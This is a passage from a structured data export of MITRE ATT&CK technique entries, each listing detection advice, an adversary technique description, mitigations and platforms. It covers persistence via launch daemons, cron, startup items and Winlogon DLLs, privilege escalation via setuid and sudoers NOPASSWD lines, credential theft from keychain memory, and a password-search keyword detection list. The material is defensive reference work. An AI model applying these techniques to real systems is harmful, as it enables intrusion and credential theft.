Dumping'],https://attack.mitre.org/wiki/Technique/T1003
1419,"['Compression software and compressed files can be detected in many ways. Common utilities that may be present on the system or brought in by an adversary may be detectable through process monitoring and monitoring for command-line arguments for known compression utilities. This may yield a significant amount of benign events, depending on how systems in the environment are typically used.\n\nIf the communications channel is unencrypted, compressed files can be detected in transit during exfiltration with a network intrusion detection or data loss prevention system analyzing file headers.[[CiteRef::Wikipedia File Header Signatures]]']",[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","['An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.']",[],[],[],"['Identify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to compress files, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]\n\nIf network intrusion prevention or data loss prevention tools are set to block specific file types from leaving the network over unencrypted channels, then an adversary may move to an encrypted channel.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Exfiltration'],Technique/T1002,['Data Compressed'],https://attack.mitre.org/wiki/Technique/T1002
1420,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Process monitoring', 'Network protocol analysis']","['Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, commingling legitimate traffic with C2 communications traffic, or using a non-standard data encoding system, such as a modified Base64 encoding for the message body of an HTTP request.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1001,['Data Obfuscation'],https://attack.mitre.org/wiki/Technique/T1001
1421,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['574'],[],"['Process command-line parameters', 'Process monitoring']","['Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are ""sc,"" ""tasklist /svc"" using [[Software/S0057|Tasklist]], and ""net start"" using [[Software/S0039|Net]], but adversaries may also use other tools as well.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about services, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],Technique/T1007,['System Service Discovery'],https://attack.mitre.org/wiki/Technique/T1007
1422,"['Monitor handle opens on drive volumes that are made by processes to determine when they may directly access logical drives.[[CiteRef::Github PowerSploit Ninjacopy]]\n\nMonitor processes and command-line arguments for actions that could be taken to copy files from the logical drive and evade common file system protections. Since this technique may also be used through [[Technique/T1086|PowerShell]], additional logging of PowerShell scripts is recommended.']","['File monitoring', 'File system access controls']",[],[],['API monitoring'],"['Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools.[[CiteRef::Hakobyan 2009]]\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell.[[CiteRef::Github PowerSploit Ninjacopy]]']",[],[],[],"['Identify potentially malicious software that may be used to access logical drives in this manner, and audit and/or block it by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],[],[],['Defense Evasion'],Technique/T1006,['File System Logical Offsets'],https://attack.mitre.org/wiki/Technique/T1006
1423,['Monitor processes and command-line arguments for actions that could be taken to collect files from a system. Remote access tools with built-in features may interact directly with the Windows API to gather data. Data may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].'],[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Sensitive data can be collected from local system sources, such as the file system or databases of information residing on the system prior to [[Exfiltration]].\n\nAdversaries will often search the file system on computers they have compromised to find files of interest. They may do this using a [[Technique/T1059|Command-Line Interface]], such as [[Software/S0106|cmd]], which has functionality to interact with the file system to gather information. Some adversaries may also use [[Technique/T1119|Automated Collection]] on the local system.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from the local system, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],['Privileges to access certain files and directories'],[],['Collection'],Technique/T1005,['Data from Local System'],https://attack.mitre.org/wiki/Technique/T1005
1424,"['Monitor for changes to registry entries in <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify</code> that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values.[[CiteRef::TechNet Autoruns]]  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.\n\nLook for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].']",[],['579'],[],"['Windows Registry', 'File monitoring', 'Process monitoring']","['Winlogon is a part of some Windows versions that performs actions at logon. In Windows systems prior to Windows Vista, a Registry key can be modified that causes Winlogon to load a DLL on startup. Adversaries may take advantage of this feature to load adversarial code at startup for persistence.']",[],[],[],['Upgrade the operating system to a newer version of Windows if using a version prior to Vista. \n\nLimit the privileges of user accounts so that only authorized administrators can perform Winlogon helper changes.\n\nIdentify and block potentially malicious software that may be executed through the Winlogon helper process by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] that are capable of auditing and/or blocking unknown DLLs.'],"['Windows Server 2003', 'Windows XP', 'Windows Server 2003 R2']","['Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1004,['Winlogon Helper DLL'],https://attack.mitre.org/wiki/Technique/T1004
1425,['Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.'],[],[],[],[],"['Starting in Mac OS X 10.7 (Lion), users can specify certain applications to be re-opened when a user reboots their machine. While this is usually done via a Graphical User Interface (GUI) on an app-by-app basis, there are property list files (plist) that contain this information as well located at <code>~/Library/Preferences/com.apple.loginwindow.plist</code> and <code>~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist</code>. \n\nAn adversary can modify one of these files directly to include a link to their malicious executable to provide a persistence mechanism each time the user reboots their machine[[CiteRef::Methods of Mac Malware Persistence]].']",[],[],[],['Holding the Shift key while logging in prevents apps from opening automatically[[CiteRef::Re-Open windows on Mac]]. This feature can be disabled entirely with the following terminal command: <code>defaults write -g ApplePersistence -bool no</code>.'],"['MacOS', 'OS X']",['User'],[],[],['Persistence'],Technique/T1164,['Re-opened Applications'],https://attack.mitre.org/wiki/Technique/T1164
1426,"['The <code>/Library/StartupItems</code> folder can be monitored for changes. Similarly, the programs that are actually executed from this mechanism should be checked against a whitelist. Monitor processes that are executed during the bootup process to check for unusual or unknown applications and behavior.']",[],[],[],"['File monitoring', 'Process Monitoring']","[u'Per Apple\u2019s documentation, startup items execute during the final phase of the boot process and contain shell scripts or other executable files along with configuration information used by the system to determine the execution order for all startup items[[CiteRef::Startup Items]]. This is technically a deprecated version (superseded by Launch Daemons), and thus the appropriate folder, <code>/Library/StartupItems</code> isn\u2019t guaranteed to exist on the system by default, but does appear to exist by default on macOS Sierra. A startup item is a directory whose executable and configuration property list (plist), <code>StartupParameters.plist</code>, reside in the top-level directory. \n\nAn adversary can create the appropriate folders/files in the StartupItems directory to register their own persistence mechanism[[CiteRef::Methods of Mac Malware Persistence]]. Additionally, since StartupItems run during the bootup phase of macOS, they will run as root. If an adversary is able to modify an existing Startup Item, then they will be able to Privilege Escalate as well.']",[],[],[],"[u'Since StartupItems are deprecated, preventing all users from writing to the <code>/Library/StartupItems</code> directory would prevent any startup items from getting registered. Similarly, appropriate permissions should be applied such that only specific users can edit the startup items so that they can\u2019t be leveraged for privilege escalation.']","['MacOS', 'OS X']",['Administrator'],[],[],"['Persistence', 'Privilege Escalation']",Technique/T1165,['Startup Items'],https://attack.mitre.org/wiki/Technique/T1165
1427,"['Monitor the file system for files that have the setuid or setgid bits set. Monitor for execution of utilities, like chmod, and their command-line arguments to look for setuid or setguid bits being set.']",[],[],[],"['File monitoring', 'Process Monitoring', 'Process command-line parameters']","[u'When the setuid or setgid bits are set on Linux or macOS for an application, this means that the application will run with the privileges of the owning user or group respectively. Normally an application is run in the current user\u2019s context, regardless of which user or group owns the application. There are instances where programs need to be executed in an elevated context to function properly, but the user running them doesn\u2019t need the elevated privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications. These bits are indicated with an ""s"" instead of an ""x"" when viewing a file\'s attributes via <code>ls -l</code>. The <code>chmod</code> program can set these bits with via bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>.\n\nAn adversary can take advantage of this to either do a shell escape or exploit a vulnerability in an application with the setsuid or setgid bits to get code running in a different user\u2019s context.']",[],[],[],['Applications with known vulnerabilities or known shell escapes should not have the setuid or setgid bits set to reduce potential damage if an application is compromised.'],"['Linux', 'MacOS', 'OS X']",['User'],[],[],['Privilege Escalation'],Technique/T1166,['Setuid and Setgid'],https://attack.mitre.org/wiki/Technique/T1166
1428,[],[],[],[],['Process Monitoring'],"[u'In OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords.[[CiteRef::OS X Keychain]][[CiteRef::External to DA, the OS X Way]] Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an attacker need only iterate over the other values to unlock the final password.[[CiteRef::OS X Keychain]]\n\nIf an adversary can obtain root access (allowing them to read securityd\u2019s memory), then they can scan through memory to find the correct sequence of keys in relatively few tries to decrypt the user\u2019s logon keychain. This provides the adversary with all the plaintext passwords for users, WiFi, mail, browsers, certificates, secure notes, etc.[[CiteRef::OS X Keychain]][[CiteRef::OSX Keydnap malware]]']",[],[],[],[],['OS X'],['root'],[],[],['Credential Access'],Technique/T1167,['Securityd Memory'],https://attack.mitre.org/wiki/Technique/T1167
1429,"[""Monitor Launch Daemon creation through additional plist files and utilities such as Objective-See's Knock Knock application.""]",[],[],[],"['Process Monitoring', 'File monitoring']","[u'Per Apple\u2019s developer documentation, when macOS and OS X boot up, launchd is run to finish system initialization. This process loads the parameters for each launch-on-demand system-level daemon from the property list (plist) files found in <code>/System/Library/LaunchDaemons</code> and <code>/Library/LaunchDaemons</code>[[CiteRef::AppleDocs Launch Agent Daemons]]. These LaunchDaemons have property list files which point to the executables that will be launched[[CiteRef::Methods of Mac Malware Persistence]].\n \nAdversaries may install a new launch daemon that can be configured to execute at startup by using launchd or launchctl to load a plist into the appropriate directories[[CiteRef::OSX Malware Detection]]. The daemon name may be disguised by using a name from a related operating system or benign software [[CiteRef::WireLurker]]. Launch Daemons may be created with administrator privileges, but are executed under root privileges, so an adversary may also use a service to escalate privileges from administrator to root.\n \nThe plist file permissions must be root:wheel, but the script or program that it points to has no such requirement. So, it is possible for poor configurations to allow an adversary to modify a current Launch Daemon\u2019s executable and gain persistence or Privilege Escalation.']",[],[],[],['Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized administrators can create new Launch Daemons.'],"['MacOS', 'OS X']",['Administrator'],[],[],"['Persistence', 'Privilege Escalation']",Technique/T1160,['Launch Daemon'],https://attack.mitre.org/wiki/Technique/T1160
1430,['Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.'],[],[],[],"['Binary file metadata', 'Process Monitoring', 'Process command-line parameters', 'File monitoring']",[u'Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long adjustments are made to the rest of the fields and dependencies[[CiteRef::Writing Bad Malware for OSX]]. There are tools available to perform these changes. Any changes will invalidate digital signatures on binaries because the binary is being modified. Adversaries can remediate this issue by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn\u2019t checked at load time[[CiteRef::Malware Persistence on OS X]].'],[],[],[],"[u'Enforce that all binaries be signed by the correct Apple Developer IDs, and whitelist applications via known hashes. Binaries can also be baselined for what dynamic libraries they require, and if an app requires a new dynamic library that wasn\u2019t included as part of an update, it should be investigated.']","['MacOS', 'OS X']",['User'],[],[],['Persistence'],Technique/T1161,['LC_LOAD_DYLIB Addition'],https://attack.mitre.org/wiki/Technique/T1161
1431,['All the login items are viewable by going to the Apple menu -> System Preferences -> Users & Groups -> Login items. This area should be monitored and whitelisted for known good applications. Monitor process execution resulting from login actions for unusual or unknown applications.'],[],[],[],[],"[u""MacOS provides the option to list specific applications to run when a user logs in. These applications run under the logged in user's context, and will be started every time the user logs in. Login items installed using the Service Management Framework are not visible in the System Preferences and can only be removed by the application that created them[[CiteRef::Adding Login Items]]. Users have direct control over login items installed using a shared file list which are also visible in System Preferences[[CiteRef::Adding Login Items]]. These login items are stored in the user's <code>~/Library/Preferences/</code> directory in a plist file called <code>com.apple.loginitems.plist</code>[[CiteRef::Methods of Mac Malware Persistence]]. Some of these applications can open visible dialogs to the user, but they don\u2019t all have to since there is an option to \u2018Hide\u2019 the window. If an adversary can register their own login item or modified an existing one, then they can use it to execute their code for a persistence mechanism each time the user logs in[[CiteRef::Malware Persistence on OS X]][[CiteRef::OSX.Dok Malware]].""]",[],[],[],"['Restrict users from being able to create their own login items. Additionally, holding the shift key during login prevents apps from opening automatically[[CiteRef::Re-Open windows on Mac]].']","['MacOS', 'OS X']",['User'],[],[],['Persistence'],Technique/T1162,['Login Item'],https://attack.mitre.org/wiki/Technique/T1162
1432,['The <code>/etc/rc.common</code> file can be monitored to detect changes from the company policy. Monitor process execution resulting from the rc.common script for unusual or unknown applications or behavior.'],[],[],[],"['File monitoring', 'Process Monitoring']","['During the boot process, macOS and Linux both execute <code>source /etc/rc.common</code>, which is a shell script containing various utility functions. This file also defines routines for processing command-line arguments and for gathering system settings, and is thus recommended to include in the start of Startup Item Scripts[[CiteRef::Startup Items]]. In macOS and OS X, this is now a deprecated technique in favor of launch agents and launch daemons, but is currently still used.\n\nAdversaries can use the rc.common file as a way to hide code for persistence that will execute on each reboot as the root user[[CiteRef::Methods of Mac Malware Persistence]].']",[],[],[],['Limit privileges of user accounts so only authorized users can edit the rc.common file.'],"['Linux', 'MacOS', 'OS X']",['root'],[],[],['Persistence'],Technique/T1163,['Rc.common'],https://attack.mitre.org/wiki/Technique/T1163
1433,['Legitimate scheduled jobs may be created during installation of new software or through administration functions. Tasks scheduled with launchd and cron can be monitored from their respective utilities to list out detailed information about the jobs. Monitor process execution resulting from launchd and cron tasks to look for unusual or unknown applications and behavior.'],[],[],[],"['File monitoring', 'Process Monitoring']","[u'Per Apple\u2019s developer documentation, there are two supported methods for creating periodic background jobs: launchd and cron[[CiteRef::AppleDocs Scheduling Timed Jobs]].\n\n===Launchd===\n\nEach Launchd job is described by a different configuration property list (plist) file similar to Launch Daemons or Launch Agents, except there is an additional key called <code>StartCalendarInterval</code> with a dictionary of time values [[CiteRef::AppleDocs Scheduling Timed Jobs]]. This only works on macOS and OS X.\n\n===cron===\n\nSystem-wide cron jobs are installed by modifying <code>/etc/crontab</code> while per-user cron jobs are installed using crontab with specifically formatted crontab files [[CiteRef::AppleDocs Scheduling Timed Jobs]]. This works on Mac and Linux systems.\n\nBoth methods allow for commands or scripts to be executed at specific, periodic intervals in the background without user interaction. An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence[[CiteRef::Janicab]][[CiteRef::Methods of Mac Malware Persistence]][[CiteRef::Malware Persistence on OS X]], to conduct Execution as part of Lateral Movement, to gain root privileges, or to run a process under the context of a specific account.']",[],[],[],['Limit privileges of user accounts and remediate Privilege Escalation vectors so only authorized users can create scheduled tasks.  Identify and block unnecessary system utilities or potentially malicious software that may be used to schedule tasks using whitelisting tools.'],"['Linux', 'MacOS']",['Administrator'],[],[],['Persistence'],Technique/T1168,['Cron Job'],https://attack.mitre.org/wiki/Technique/T1168
1434,"[""On Linux, auditd can alert every time a user's actual ID and effective ID are different (this is what happens when you sudo).""]",[],[],[],['File monitoring'],"['The sudoers file, <code>/etc/sudoers</code>, describes which users can run which commands and from which terminals. This also describes which commands users can run as other users or groups. This provides the idea of least privilege such that users are running in their lowest possible permissions for most of the time and only elevate to other users or permissions as needed, typically by prompting for a password. However, the sudoers file can also specify when to not prompt users for passwords with a line like <code>user1 ALL=(ALL) NOPASSWD: ALL</code>[[CiteRef::OSX.Dok Malware]]. \n\nAdversaries can take advantage of these configurations to execute commands as other users or spawn processes with higher privileges. You must have elevated privileges to edit this file though.']",[],[],[],"[u'The sudoers file should be strictly edited such that passwords are always required and that users can\u2019t spawn risky processes as users with higher privilege. By requiring a password, even if an adversary can get terminal access, they must know the password to run anything in the sudoers file.']","['Linux', 'MacOS', 'OS X']",['User'],[],[],['Privilege Escalation'],Technique/T1169,['Sudo'],https://attack.mitre.org/wiki/Technique/T1169
1435,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Collection]] and [[Exfiltration]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","['Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. \n\n===Windows===\n\nExample utilities used to obtain this information are <code>dir</code> and <code>tree</code>.[[CiteRef::Windows Commands JPCERT]] Custom tools may also be used to gather file and directory information and interact with the Windows API.\n\n===Mac and Linux===\n\nIn Mac and Linux, this kind of discovery is accomplished with the <code>ls</code>, <code>find</code>, and <code>locate</code> commands.']",[],[],[],"['File system activity is a common part of an operating system, so it is unlikely that mitigation would be appropriate for this technique. It may still be beneficial to identify and block unnecessary system utilities or potentially malicious software by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Some folders may require Administrator, SYSTEM or specific user depending on permission levels and access controls']",[],['Discovery'],Technique/T1083,['File and Directory Discovery'],https://attack.mitre.org/wiki/Technique/T1083
1436,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['311'],[],"['Process command-line parameters', 'Process monitoring']","['An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture.\n\n===Windows===\n\nExample commands and utilities that obtain this information include <code>ver</code>, [[Software/S0096|Systeminfo]], and <code>dir</code> within [[Software/S0106|cmd]] for identifying information based on present files and directories.\n\n===Mac===\n\nOn Mac, the <code>systemsetup</code> command gives a detailed breakdown of the system, but it requires administrative privileges. Additionally, the <code>system_profiler</code> gives a very detailed breakdown of configurations, firewall rules, mounted volumes, hardware, and many other things without needing elevated permissions.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about the operating system and underlying hardware, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],Technique/T1082,['System Information Discovery'],https://attack.mitre.org/wiki/Technique/T1082
1437,"['While detecting adversaries accessing these files may be difficult without knowing they exist in the first place, it may be possible to detect adversary use of credentials they have obtained. Monitor the command-line arguments of executing processes for suspicious words or regular expressions that may indicate searching for a password (for example: password, pwd, login, secure, or credentials). See [[Technique/T1078|Valid Accounts]] for more information.']",[],['545'],[],"['File monitoring', 'Process command-line parameters']","['Adversaries may search local file systems and remote file shares for files containing passwords.  These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.\n\nIt is possible to extract passwords from backups or saved virtual machines through [[Technique/T1003|Credential Dumping]].[[CiteRef::CG 2014]] Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.[[CiteRef::SRD GPP]]']",[],[],[],['Establish an organizational policy that prohibits password storage in files. Ensure that developers and system administrators are aware of the risk associated with having plaintext passwords in software configuration files that may be left on endpoint systems or servers. Preemptively search for files containing passwords and remove when found. Restrict file shares to specific directories with access only to necessary users. Remove vulnerable Group Policy Preferences.[[CiteRef::Microsoft MS14-025]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",['Access to files'],[],['Credential Access'],Technique/T1081,['Credentials in Files'],https://attack.mitre.org/wiki/Technique/T1081
1438,['Processes that write or overwrite many files to a network shared directory may be suspicious. Monitor processes that are executed from removable media for malicious or abnormal activity such as network connections due to [[Command and Control]] and possible network [[Discovery]] techniques.'],[],['562'],[],"['File monitoring', 'Process monitoring']","[""Content stored on network drives or in other shared locations may be tainted by adding malicious programs, scripts, or exploit code to otherwise valid files. Once a user opens the shared tainted content, the malicious portion can be executed to run the adversary's code on a remote system. Adversaries may use tainted shared content to move laterally.""]",[],[],[],"['Protect shared folders by minimizing users who have write access. Use utilities that detect or mitigate common features used in exploitation, such as the Microsoft Enhanced Mitigation Experience Toolkit (EMET).\n\nIdentify potentially malicious software that may be used to taint content or may result from it and audit and/or block the unknown programs by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Access to shared folders and content with write permissions'],[],['Lateral Movement'],Technique/T1080,['Taint Shared Content'],https://attack.mitre.org/wiki/Technique/T1080
1439,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['575'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']","['Adversaries may attempt to get a listing of local system or domain accounts. \n\n===Windows===\n\nExample commands that can acquire this information are <code>net user</code>, <code>net group <groupname></code>, and <code>net localgroup <groupname></code> using the [[Software/S0039|Net]] utility or through use of [[Software/S0105|dsquery]]. If adversaries attempt to identify the primary user, currently logged in user, or set of users that commonly uses a system, [[Technique/T1033|System Owner/User Discovery]] may apply.\n\n===Mac===\n\nOn Mac, groups can be enumerated through the <code>groups</code> and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q group</code> can also be used to enumerate groups and users.\n\n===Linux===\n\nOn Linux, local users can be enumerated through the use of the <code>/etc/passwd</code> file which is world readable. In mac, this same file is only used in single-user mode in addition to the <code>/etc/master.passwd</code> file.\n\nAlso, groups can be enumerated through the <code>groups</code> and <code>id</code> commands. In mac specifically, <code>dscl . list /Groups</code> and <code>dscacheutil -q group</code> can also be used to enumerate groups and users.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about system and domain accounts, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",['User'],[],[],['Discovery'],Technique/T1087,['Account Discovery'],https://attack.mitre.org/wiki/Technique/T1087
1440,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","['PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.[[CiteRef::TechNet PowerShell]] Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs a command locally or on a remote computer. 